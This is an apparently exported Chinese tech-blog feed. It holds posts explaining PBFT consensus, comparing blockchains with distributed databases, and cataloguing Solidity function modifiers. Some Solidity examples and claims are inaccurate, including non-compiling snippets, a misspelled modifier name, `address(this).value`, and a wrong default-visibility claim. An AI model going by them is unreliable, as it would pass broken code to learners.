    <title>PBFT实用拜占庭容错算法原理</title>
    <link href="/2022/09/17/PBFT%E5%AE%9E%E7%94%A8%E6%8B%9C%E5%8D%A0%E5%BA%AD%E5%AE%B9%E9%94%99%E7%AE%97%E6%B3%95/"/>
    <url>/2022/09/17/PBFT%E5%AE%9E%E7%94%A8%E6%8B%9C%E5%8D%A0%E5%BA%AD%E5%AE%B9%E9%94%99%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本篇文章开启区块链共识算法的教学——我以 PBFT （Practical-Byzantine-fault-tolerant）实用拜占庭容错共识算法打头阵。</p><p>为什么先是PBFT呢？</p><p>一个原因是觉得这个算法的名字很酷，实际上它也有着有趣的历史背景。另一个原因呢，就是最近在接触联盟链，而这个算法呢，正是专属于联盟链的共识算法。</p></blockquote><h2 id="共识算法概览"><a href="#共识算法概览" class="headerlink" title="共识算法概览"></a>共识算法概览</h2><p><img src="/2022/09/17/PBFT%E5%AE%9E%E7%94%A8%E6%8B%9C%E5%8D%A0%E5%BA%AD%E5%AE%B9%E9%94%99%E7%AE%97%E6%B3%95/a.png" alt="1"></p><p>联盟链有两个共识算法：一个是本章将去讲的PBFT，另一个就是DBFT(Delegated Byzantine fault tolerance)委托拜占庭容错共识算法。</p><blockquote><p>在区块链中有一个著名的问题，就是拜占庭将军问题，对于拜占庭将军问题，这里不再做普及，因为网上相关的文章已经很多了。不了解的同学移步至此<a href="https://zhuanlan.zhihu.com/p/107439021">拜占庭将军问题</a>。</p></blockquote><h2 id="PBFT为何而来"><a href="#PBFT为何而来" class="headerlink" title="PBFT为何而来"></a>PBFT为何而来</h2><p>PBFT 刚开始是在MIT的Miguel 和 Barbara Liskov在1999年的学术论文中提出的，他们的本意是为设计一个低延迟存储系统设计系统，将算法复杂度由指数级降低到多项式级，使得拜占庭容错算法在实际系统应用中变得可行，主要是为了应用于不需要大交易量但需要处理许多事件的数字资产平台，每个节点都可以发布公钥，这是被允许的。</p><p>节点将签名所有通过节点的消息，以验证其准确性。当得到一定数量的签名想用，此交易就被认定为有效。</p><p>解决了BFT(原始拜占庭容错算法)效率不高的问题，将算法复杂度由指数级降低到多项式级，使得拜占庭容错算法在实际系统应用中变得可行。</p><h2 id="PBFT对付恶意节点"><a href="#PBFT对付恶意节点" class="headerlink" title="PBFT对付恶意节点"></a>PBFT对付恶意节点</h2><h3 id="几个数字"><a href="#几个数字" class="headerlink" title="几个数字"></a>几个数字</h3><blockquote><p>了解即可，后面会提到</p><p>f 是恶意节点数，N是总结点数</p></blockquote><ol><li>3f ： 临界点数</li><li>3f + 1  ：总结点最小数</li><li>(N-1)&#x2F;3 ：最大容错节点数</li></ol><p>当节点数&gt;3时，拜占庭将军问题的有解情况将会比较复杂；</p><p>For example：</p><h3 id="N-x3D-3f"><a href="#N-x3D-3f" class="headerlink" title="N &#x3D; 3f"></a>N &#x3D; 3f</h3><p>当<strong>恶意节点数</strong>f &#x3D; 1时，<strong>总结点数</strong>N &#x3D; 3f &#x3D; 3时，问题将会无解，如下图所示</p><p><img src="/2022/09/17/PBFT%E5%AE%9E%E7%94%A8%E6%8B%9C%E5%8D%A0%E5%BA%AD%E5%AE%B9%E9%94%99%E7%AE%97%E6%B3%95/PBFT%E5%AE%9E%E7%94%A8%E6%8B%9C%E5%8D%A0%E5%BA%AD%E5%AE%B9%E9%94%99%E7%AE%97%E6%B3%95%5Cb.jpg"></p><p>显而易见，在f &#x3D; N&#x2F;3的时候，整个节点系统都将无法做出正确的决定；因为恶意节点恶意传递结果，导致无论恶意节点时发令者还是接令者，都会坏了整个结果的输出；</p><h3 id="N-gt-3f"><a href="#N-gt-3f" class="headerlink" title="N &gt; 3f"></a>N &gt; 3f</h3><p>当<strong>恶意节点数</strong>f &#x3D; 1时，<strong>总结点数</strong>N &gt; 3f &#x3D; 4时，问题将会得到解决，如下图所示：</p><p><img src="/2022/09/17/PBFT%E5%AE%9E%E7%94%A8%E6%8B%9C%E5%8D%A0%E5%BA%AD%E5%AE%B9%E9%94%99%E7%AE%97%E6%B3%95/PBFT%E5%AE%9E%E7%94%A8%E6%8B%9C%E5%8D%A0%E5%BA%AD%E5%AE%B9%E9%94%99%E7%AE%97%E6%B3%95%5Cc.jpg"></p><p><img src="/2022/09/17/PBFT%E5%AE%9E%E7%94%A8%E6%8B%9C%E5%8D%A0%E5%BA%AD%E5%AE%B9%E9%94%99%E7%AE%97%E6%B3%95/PBFT%E5%AE%9E%E7%94%A8%E6%8B%9C%E5%8D%A0%E5%BA%AD%E5%AE%B9%E9%94%99%E7%AE%97%E6%B3%95%5Cd.jpg"></p><p>无论恶意节点如何恶意地传递信息，由于还存在着其他三个公平节点，因此最后总是能够<strong>少数服从多数</strong>，得到最终的结果。</p><h3 id="为什么最大容错节点数是（N-1）-x2F-3-？"><a href="#为什么最大容错节点数是（N-1）-x2F-3-？" class="headerlink" title="为什么最大容错节点数是（N-1）&#x2F;3  ？"></a>为什么最大容错节点数是（N-1）&#x2F;3  ？</h3><p>假定节点总数是N，作恶节点数为f，那么剩下的正确节点数为<code>N - f</code>。</p><p>意味着只要收到N - f个消息且<code>N - f &gt; f</code>就能做出决定，但是这<code>N - f</code>个消息里可能有f个是由作恶节点冒充的（或因网络延迟导致f个恶意节点的消息先被收到），那么正确的消息就是<code>N - f - f</code>个。</p><p>为了多数一致，正确消息必须占多数，也就是<code>N - f - f &gt; f </code>，所以N最少是<code>3f + 1</code>个。 </p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ul><li>节能。</li><li>吞吐量高。</li><li>分叉几率很低。</li><li>节点数适当时交易延时极低。</li><li>PBFT中的主节点并不具备很大权限，与普通节点地位相对平等，如果主节点出现问题，普通节点可以拒绝其请求并可以很容易地将其替换。</li></ul><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><ul><li>节点需要选举或许可，不像PoW可以随意加入，去中心化程度相对较弱。</li><li>不能很好的存贮记录交易信息，黑客能够截取一些失效的副本，这可能会让信息外漏。</li><li>系统节点是固定的，无法应对公有链的开放环境。因此只适用于节点数量少且网络环境更可信的联盟链或私有链。</li><li>安全边界较Pow等算法相对较低。Pow对网络内恶意算力容忍度为不超过1&#x2F;2，PBFT对恶意节点数的容忍度则为1&#x2F;3。</li><li>受节点数量限制，可扩展性差，由于每个副本节点都需要和其它节点进行P2P的共识同步，因此随着节点的增多，性能会下降的很快。</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2>]]></content>
    
    
    <categories>
      
      <category>区块链</category>
      
      <category>共识算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PBFT</tag>
      
      <tag>联盟链</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>区块链VS分布式数据库：革新与代价</title>
    <link href="/2022/09/11/%E5%8C%BA%E5%9D%97%E9%93%BEVS%E5%88%86%E5%B8%83%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%9A%E9%9D%A9%E6%96%B0%E4%B8%8E%E4%BB%A3%E4%BB%B7/"/>
    <url>/2022/09/11/%E5%8C%BA%E5%9D%97%E9%93%BEVS%E5%88%86%E5%B8%83%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%9A%E9%9D%A9%E6%96%B0%E4%B8%8E%E4%BB%A3%E4%BB%B7/</url>
    
    <content type="html"><![CDATA[<h1 id="区块链VS分布式数据库：革新与代价"><a href="#区块链VS分布式数据库：革新与代价" class="headerlink" title="区块链VS分布式数据库：革新与代价"></a>区块链VS分布式数据库：革新与代价</h1><p><strong>前情提示：本文较为硬核，若有兴趣需耐心阅读，不感兴趣请跳至简言之，喜欢思辨的同学可以跳至悖论，希望对有心之人产生启发~</strong></p><blockquote><p>自2009年比特币正式诞生，到2013年以太坊横空出世，再到今22年的9月15号以太坊即将迎来合并的巨大变革。我们对于区块链的技术的认知越来越趋向“越来越像分布式数据库”发展。</p><p>而事实也确实如此，区块链从诞生之初只服务于加密货币，到现在随着智能合约、共识技术的发展，区块链也慢慢被用来服务于通用的数据管理系统。</p><p>只不过，在区块链的身上仍散发着这一代人激进与寻求突破的气息。相对于分布式数据库，区块链有很大的革新，但代价也不会小。</p><p>如何权衡这样的 “交换”，我将从它们之间的四个差异点（复制、并发、存储、分片）出发。</p></blockquote><h2 id="区块链"><a href="#区块链" class="headerlink" title="区块链"></a>区块链</h2><p>区块链最初只是用来服务加密货币，例如比特币和由此衍生的其它加密货币。</p><p>在 2014 年，以太坊的出现给区块链带来了智能合约。智能合约的出现，使得区块链上的应用不仅局限于加密货币，还可以支持图灵完全（Turing-complete）的应用计算，这使得区块链逐渐朝着一种通用的去中心化计算平台发展。</p><p>从<strong>数据结构</strong>的角度来看，区块链是一条由哈希指针串联起来的区块链表，每个区块中包含了一系列交易。</p><p>从<strong>系统</strong>的角度来看，区块链是一个由多个互不信任的节点共同维护一个全网一致的账本的分布式系统。</p><p>从<strong>分布式系统</strong>的角度来看，区块链解决了公开网络中的<strong>拜占庭</strong>（存在恶意节点）共识问题。</p><ul><li>拜占庭共识问题</li></ul><p><img src="/2022/09/11/%E5%8C%BA%E5%9D%97%E9%93%BEVS%E5%88%86%E5%B8%83%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%9A%E9%9D%A9%E6%96%B0%E4%B8%8E%E4%BB%A3%E4%BB%B7/1.webp" alt="1"></p><p>区块链可以分为许可链和非许可链。其中非许可链是完全开放的，每一个人都有资格记账、读取数据，例如比特币、以太坊。而许可链则有一定的准入机制和权限控制，例如国内的蚂蚁链。尽管早期区块链的底层设计与数据库完全不同，但是智能合约应用到了区块链以后，用户能够自由地部署和运行图灵完备的代码，使得区块链与分布式数据库之间产生了可比性。</p><h2 id="分布式数据库"><a href="#分布式数据库" class="headerlink" title="分布式数据库"></a>分布式数据库</h2><p>分布式数据库是一种数据存储在不同物理位置的数据库。多年来，传统的关系型数据库一直是主流。由于大数据处理和硬件发展等等的现实原因，为了实现系统的高可用性和可扩展性，分布式系统开始进化，在这个新的设计趋势下，出现了NoSQL和NewSQL。</p><p>NoSQL 更倾向于提供可用性，而不是一致性。采用 NoSQL 的数据库可以选择多种不同的一致性等级，不同的等级会导致系统表现不同的性能。用户可以根据实际的使用场景在性能和一致性上进行取舍。</p><p>NoSQL 的这种设计虽然更加灵活，但加大了上层应用的复杂性，因此一种介于关系数据库与 NoSQL 之间的设计，NewSQL 应运而生。NewSQL 既保留了关系数据库的数据模型以及对 ACID 语义的支持，同时也维持了一定的可扩展性。</p><p><img src="/2022/09/11/%E5%8C%BA%E5%9D%97%E9%93%BEVS%E5%88%86%E5%B8%83%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%9A%E9%9D%A9%E6%96%B0%E4%B8%8E%E4%BB%A3%E4%BB%B7/2.webp" alt="2"></p><h2 id="代价与革新"><a href="#代价与革新" class="headerlink" title="代价与革新"></a>代价与革新</h2><blockquote><p>区块链小弟在发展中不经意继承了分布式数据库大哥的衣钵，但在“穿衣风格”上，小弟穿的更具有时代更迭的气息，也就是更具有包容性与激进性；如何理解它的包容与激进，如何权衡代价与革新：我将从四个点出发</p></blockquote><h3 id="1-Replication（复制）"><a href="#1-Replication（复制）" class="headerlink" title="1. Replication（复制）"></a>1. Replication（复制）</h3><p>首先我要提及复制，对数据进行复制是防止节点失效影响的最直接、最有效的方法。然而复制也将带来一个非常严重的问题——<strong>数据一致性问题</strong>。</p><p>解决<strong>数据一致性问题</strong>的一个非常经典方式就是<strong>状态复制机</strong>（state machine replication），即所有节点起始于相同的状态，维护相同的交易日志，于是只要每个节点按照相同的顺序执行每一笔交易，则每个节点的状态也应该是相同的。</p><p>实现<strong>状态复制机</strong>的一个关键技术就是<strong>共识算法</strong>，而区块链基于分布式数据库的区别之一便是共识算法。</p><ul><li>在传统的分布式数据库当中，节点属于值得信任的内部系统，因而只需要容忍节点宕机，数据库通常使用<strong>CFT</strong>协议（<strong>Protocols that tolerate crash failures</strong>），例如Paxos、Raft；</li><li>而在区块链中，各个节点需要在互不信任的情况下达成共识，因此需要容忍节点的恶意行为，因此区块链常常会使用代价更大的<strong>BFT</strong> 协议（<strong>Protocols that tolerate Byzantine failures</strong>），例如<strong>PBFT</strong>、PoW等。</li><li>如下表所示，在故障点数F已知的情况之下，CFT与BFT协议在不同的网络模型当中需要达到的网络规模区别是很大的。</li></ul><table><thead><tr><th align="center"></th><th align="center">同步网络</th><th align="center">异步网络</th></tr></thead><tbody><tr><td align="center">CFT</td><td align="center">F+1</td><td align="center">2F+1</td></tr><tr><td align="center">BFT</td><td align="center">2F+1</td><td align="center">3F+1</td></tr><tr><td align="center"></td><td align="center">由此也可知区块链复制的代价比分布式数据库大很多</td><td align="center"></td></tr></tbody></table><p>除了共识算法的不同，区块链和分布式数据库还在<strong>复制的级别</strong>上存在差异，也就是我们常说的数据粒度。</p><ul><li><p>分布式数据库由于可以依赖一个中心化的“调度员”（这是个可以信赖的系统内部中心），因此在做复制之前可以首先由“调度员”将交易分成更细粒度的指令再分发给不同的节点做复制。</p></li><li><p>而在区块链中，交易本身并不需要复制到所有节点，负责执行指令的节点也不知道原交易的执行逻辑。然而区块链没有可信赖的中心，于是一般在<strong>交易级别</strong>做复制，之后再由每个节点执行交易中所包含的所有指令。</p></li></ul><h4 id="简言之"><a href="#简言之" class="headerlink" title="简言之"></a>简言之</h4><p>在解决数据一致性上，共识算法是解决问题的根本，但区块链往往需要为了它所谓的<strong>去中心化</strong>付出更多代价。</p><h3 id="2-Concurrency（并发）"><a href="#2-Concurrency（并发）" class="headerlink" title="2. Concurrency（并发）"></a>2. Concurrency（并发）</h3><p>并发指的是让交易或事务在同一时间执行。</p><ul><li><p>在传统分布式数据库中，并发控制技术一直是研究热点，好的并发优化能够使得数据库系统的性能大大提升。</p></li><li><p>而在现有的大部分区块链中，交易仍然是串行执行的。区块链对并发的支持并不友好，主要原因在于，交易执行在很多区块链系统中并非性能瓶颈。例如，在比特币中，一个区块的执行时间在毫秒级，相比于 10 分钟的区块产生时间，执行部分几乎可以忽略不计。其次，由于交易常常会共用合约的状态数据，因而串行执行往往是最简单和保险的方式。</p></li></ul><h4 id="简言之-1"><a href="#简言之-1" class="headerlink" title="简言之"></a>简言之</h4><p>在并发层面，分布式数据库追求极致的并发以提高性能；而区块链并不支持并发，为了保证节点数据的安全与公正。</p><h3 id="3-Storage（存储）"><a href="#3-Storage（存储）" class="headerlink" title="3. Storage（存储）"></a>3. Storage（存储）</h3><ul><li><p>区块链是一个 <strong>append-only</strong> 的账本，包含了从创世区块开始到最新的区块中包含的全部交易历史，这也就导致了很多主流的区块链的存储量动辄就要上百 GB。为了支持真实性验证，区块链一般采用类似 <strong>Merkle Tree</strong> 的数据结构存储区块中的交易。</p></li><li><p>而在大部分的数据库中，除非是有特殊的需求，用户一般只能访问最新的数据。历史数据会以 log 的形式保存一段时间供节点失效恢复的时候使用，但一般会被定期清理掉以节省存储空间。另一方面，由于分布式数据库更在乎性能，因此在建立索引的时候会根据硬件的性质进行特殊的优化。例如，数据在硬盘中一般会以 <strong>B+ 树</strong>的数据结构存储，而在内存中则用对多核并行和缓存更加友好的 FAST 或 PSL 等结构。</p></li></ul><h4 id="简言之-2"><a href="#简言之-2" class="headerlink" title="简言之"></a>简言之</h4><p>​区块链上的数据是不可篡改的，因此它的存储量将会远超分布式数据库，在主流公链上存储量更是大得可怕。因此在数据结构的选择上，区块链将会选择便于快速数据验证的数据结构如 <strong>Merkle Tree</strong> ；在分布式数据库上将会选择有利于提升性能的数据结构如<strong>B+ 树</strong>。</p><p>[^Merkle Tree]: 默克尔树，区块链用于数据验证的数据结构。可参考这篇文章<a href="https://nangbowan.github.io/2022/09/02/Merkle%E6%A0%91%E2%80%94%E2%80%94%E9%AA%8C%E8%AF%81NFT%E7%99%BD%E5%90%8D%E5%8D%95/">Merkle树——验证NFT白名单 </a><br>[^append-only]: append-only 是计算机数据存储的一种属性，将新数据附加到存储中，但现有数据是不可变的。</p><h3 id="4-Sharding（分片）"><a href="#4-Sharding（分片）" class="headerlink" title="4. Sharding（分片）"></a>4. Sharding（分片）</h3><p>分片技术是提高数据库可拓展性的关键性技术，它将数据分布到不同的shard当中，由shard中的节点进行处理，从而达到扩展系统或提升处理性能的目的。</p><p>然而在区块链中引入shard并不简单，主要有两个挑战</p><p><strong>第一，如何进行分片？</strong></p><p>我们都知道区块链需要容忍拜占庭错误，而这依赖于一个大前提，即网络中一定比例的节点是诚实的。</p><blockquote><p>例如，在 PoW 中要求总算力的 50% 是诚实的，而 PBFT (实用拜占庭容错算法)则要求超过 2&#x2F;3 的节点数是诚实的。</p></blockquote><p>在将区块链的网络进行sharding时就需要保证每个shard的安全假设都是成立的，一旦有一个 shard 的安全前提不成立，那么整个系统的安全性都无法保证。</p><p>然而由于在sharding的时候一般都是<strong>随机</strong>将节点分配到不同的shard，这就要求总结点数规模要足够大，<strong>而且shard的个数不能过多</strong>，这样才能<strong>保证每个 shard 中有足够数量的节点保证安全前提能够成立</strong>。</p><p><strong>第二，如何保证shard之间的原子性？</strong></p><p>即一笔交易要么在所有shard都 commit，要么在所有shard都 abort。</p><p>shard的原子性要求跨shard的事务在它涉及到的所有shard中要么都提交，要么都中止，表现出行为上的一致性。</p><ul><li>在分布式数据库中，原子性一般由<strong>2PC</strong>保证，这需要依赖某个可信的“调度者”。</li><li>而区块链中缺少这样的协调者，因此会引入<strong>BFT</strong>协议来协调跨分片交易。</li></ul><p>[^2PC]: 2 Phase Commit，两阶段提交协议</p><h4 id="简言之-3"><a href="#简言之-3" class="headerlink" title="简言之"></a>简言之</h4><p>在分片层面，区块链由于需要保证各片区的安全性，它分片的门槛会相对更高，并且仍会有几率组成不安全的整体。并且区块链技术由于缺少可信任的内部中心化调度者，在实现原子性层面上需要使用代价更大的BFT协议。</p><h2 id="悖论——哲学思考"><a href="#悖论——哲学思考" class="headerlink" title="悖论——哲学思考"></a>悖论——哲学思考</h2><p>让我觉得很有意思的一件事就是：区块链致力于实现去中心化，因此就直接舍去了在系统内部的那个可以值得信任的“中心化调度者”。</p><p>然而，这样的舍弃必然付出代价，在与分布式数据库做差异对比的时候，区块链在每一个层面都在为自己埋下的伏笔“填坑”，也就是为了去中心化而不得不走“中心化”的老路。</p><p>这一点让我不禁一笑，本身在人类社会中，将<strong>权利完全下放</strong>是一件需要人类文明上升几个维度才可能实现的事，毕竟人心才是最可怕的。</p><p>于是我们在区块链中模拟了这样的试验，将权力下放给每一个节点，每个人都是真真正正的平等（仅在公链中）。</p><p>让我们来看看试验结果——区块链如今快成了“诈骗”的代名词。有的人骗术高明，因而一夜暴富；也有的人提供平台，可持续性地竭泽而渔，开赌场了属于是；更有的人涉世未深，却想着靠区块链技术暴富，只落得倾家荡产的下场；</p><p>虽然完全公平，但这里就像<strong>罪恶都市</strong>，一切贪婪，犯罪，欺骗，在这里统统被无条件地放大。</p><p>回到上文提及的系统内部“中心化调度者”，实际上只要这样的“中心化调度者”的操纵者拥有一颗“纯洁的心灵”，纯洁到公平地对待一切处理，那么区块链技术将没必要存在，也不可能被发明，但现实生活中我想不会存在这样的人吧。</p><p>因此，我最想说的是，我们设法用技术的革新来填补人心的无底洞，然而得到的却是——<strong>从一个人的贪婪走向一群人的贪婪</strong>。</p><h2 id="走向融合"><a href="#走向融合" class="headerlink" title="走向融合"></a>走向融合</h2><p>随着区块链技术逐渐走向落地，无论是工业界还是学术界都在致力于提高区块链的性能，其中借鉴分布式数据库中成熟的技术则是<strong>最简单和保险</strong>的做法。例如，BlockchainDB  和 FalconDB 就在区块链系统的基础上引入数据库的 feature，使得互不信任的多方可以共同参与维护一个可验证的数据库。</p><p>另一方面，区块链所具备的一些安全特性也受到了一些数据库设计者的青睐，使得一些新型的更加追求安全性的数据库也具备了区块链的基因。例如，Blockchain Relational Database 就是在 PostgreSQL 的基础上引入区块链中所具备的去中心化和可追溯的特性所设计的新型关系数据库。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>[1] Blockchains vs. Distributed Databases: Dichotomy and Fusion: <a href="https://link.zhihu.com/?target=https://arxiv.org/abs/1910.01310">Blockchains vs. Distributed Databases: Dichotomy and Fusion</a></p><p>[2] Casper: <a href="https://link.zhihu.com/?target=https://github.com/ethereum/casper">ethereum&#x2F;casper</a></p><p>[3] BlockchainDB - A Shared Database on Blockchains: <a href="https://link.zhihu.com/?target=http://www.vldb.org/pvldb/vol12/p1597-el-hindi.pdf">http://www.vldb.org/pvldb/vol12/p1597-el-hindi.pdf</a></p><p>[4] FalconDB: Blockchain-based Collaborative Database: <a href="https://link.zhihu.com/?target=http://www.cs.utah.edu/~lifeifei/papers/falcondb.pdf">http://www.cs.utah.edu/~lifeifei&#x2F;papers&#x2F;falcondb.pdf</a></p><p>[5] Blockchain Meets Database: Design and Implementation of a Blockchain Relational Database: <a href="https://link.zhihu.com/?target=http://www.vldb.org/pvldb/vol12/p1539-nathan.pdf">http://www.vldb.org/pvldb/vol12/p1</a></p>]]></content>
    
    
    <categories>
      
      <category>区块链</category>
      
      <category>分布式数据库</category>
      
    </categories>
    
    
    <tags>
      
      <tag>革新</tag>
      
      <tag>思考未来</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nginx&amp;Caddy操作小结</title>
    <link href="/2022/09/09/Nginx-Caddy%E6%93%8D%E4%BD%9C%E5%B0%8F%E7%BB%93/"/>
    <url>/2022/09/09/Nginx-Caddy%E6%93%8D%E4%BD%9C%E5%B0%8F%E7%BB%93/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Solidity函数修饰符大全</title>
    <link href="/2022/09/09/Solidity%E5%87%BD%E6%95%B0%E4%BF%AE%E9%A5%B0%E7%AC%A6%E5%A4%A7%E5%85%A8/"/>
    <url>/2022/09/09/Solidity%E5%87%BD%E6%95%B0%E4%BF%AE%E9%A5%B0%E7%AC%A6%E5%A4%A7%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="可见性修饰符"><a href="#可见性修饰符" class="headerlink" title="可见性修饰符"></a>可见性修饰符</h2><blockquote><p>决定函数何时和被谁调用。</p></blockquote><p>public ：函数对外可见，可以在任何地方调用，不管是内部还是外部；</p><p>private ：函数对外不可见，只能被合约内部调用；</p><p>external：函数对外可见，只能从合约外部调用；</p><p>internal ：函数对外不可见，只能被合约内部调用或者被继承的合约调用；</p><h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><p>&#x3D;&#x3D;不写默认就是public&#x3D;&#x3D;</p><h2 id="状态修饰符"><a href="#状态修饰符" class="headerlink" title="状态修饰符"></a>状态修饰符</h2><blockquote><p>用来表示函数如何与区块链交互。</p></blockquote><p>view ：运行这个函数不会更改和保存任何数据；</p><p>pure ：运行这个函数不仅不会往区块链写数据，甚至不从区块链读取数据；</p><p>constant: 和view的功能是一样的，在5.0版本后被废弃；</p><h3 id="example"><a href="#example" class="headerlink" title="example"></a><strong>example</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>contract Test&#123;<br>    <br>    uint256 public a1 = 100;<br>    uint256 a2 = 256;<br>    <br>    <br>    //为了明确语义，一般要加上view（constant两者完全相同）<br>    //表示不会修改函数内的状态变量<br>    function add() view returns(int)&#123;<br>        return a1+a2;<br>    &#125;<br>    <br>    function setValue(int num)&#123;<br>        a1 = num;<br>    &#125;<br>    <br>     function setValue1(int num) view&#123;<br>        a1 = num;<br>    &#125;<br>    <br>    //因为pure不读也不写入链，因此带pure的函数一般只做纯逻辑的处理<br>     function isEqual(int a, int b) public pure returns(bool) &#123;<br>       return a == b;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="注意点-1"><a href="#注意点-1" class="headerlink" title="注意点"></a>注意点</h3><p>这两种在被&#x3D;&#x3D;合约外部调用&#x3D;&#x3D;的时候都不花费任何gas</p><p>但是它们在被&#x3D;&#x3D;内部其他函数调用&#x3D;&#x3D;的时候将会耗费gas。</p><h2 id="自定义修饰符（modifiers）"><a href="#自定义修饰符（modifiers）" class="headerlink" title="自定义修饰符（modifiers）"></a>自定义修饰符（modifiers）</h2><blockquote><p>如onlyowner、aboveLevel等自定义的modifiers，对于这些修饰符我们可以自定义其对函数的约束逻辑。</p><p>所有自定义的修饰符都需要在逻辑最后留下占位符 “_;”</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">  //第一个自定义修饰器，要求只能够合约的拥有者才能够操作<br>  modifier onlyOwner() &#123;<br><br>  require(msg.sender == owner);<br>  _;<br><br>&#125;<br><br>  //第二个自定义函数修饰器，要求消息发送者携带的value大于合约的vulue<br>  modifier antherModifier() &#123;<br><br>  require(msg.value &gt; address(this).value,&quot;your balance is not enough&quot;);<br>  _;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>这些修饰符可以同时作用于一个函数定义上，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function test() external view onlyOwner anotherModifier &#123;  &#125;<br></code></pre></td></tr></table></figure><h2 id="payable修饰符"><a href="#payable修饰符" class="headerlink" title="payable修饰符"></a>payable修饰符</h2><blockquote><p>可以接收以太的特殊函数修饰符</p></blockquote><h3 id="example-one"><a href="#example-one" class="headerlink" title="example_one"></a><strong>example_one</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.24;<br><br><br>contract test1 &#123;<br>    uint public num;<br><br>    //如果构造函数中未指定payable关键字，那么创建合约时不允许转账<br>    //如果指定了payable，则可以转账<br>    constructor() public  &#123;<br>        //构造函数<br><br>    &#125;<br><br>    //任何函数，只要指定了payable关键字，这个合约就可以接受转账,调用时，也可以转0<br>    function giveMoney() public payable &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="example-two"><a href="#example-two" class="headerlink" title="example_two"></a><strong>example_two</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity"><br><br>contract OnlineStore &#123;<br><br>  function buySomething() external payable &#123;<br>    // 检查以确定0.001以太发送出去来运行函数:<br>    require(msg.value == 0.001 ether);<br>    // 如果为真，一些用来向函数调用者发送数字内容的逻辑<br>    transferThing(msg.sender);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="注意点-2"><a href="#注意点-2" class="headerlink" title="注意点"></a>注意点</h3><p> 如果一个函数没标记为payable， 而你尝试利用上面的方法发送以太，函数将拒绝你的事务。</p>]]></content>
    
    
    <categories>
      
      <category>区块链</category>
      
    </categories>
    
    
    <tags>
      
      <tag>solidity</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>实战——光速了解DAPP</title>
    <link href="/2022/09/07/%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%85%89%E9%80%9F%E4%BA%86%E8%A7%A3DAPP/"/>
    <url>/2022/09/07/%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%85%89%E9%80%9F%E4%BA%86%E8%A7%A3DAPP/</url>
    
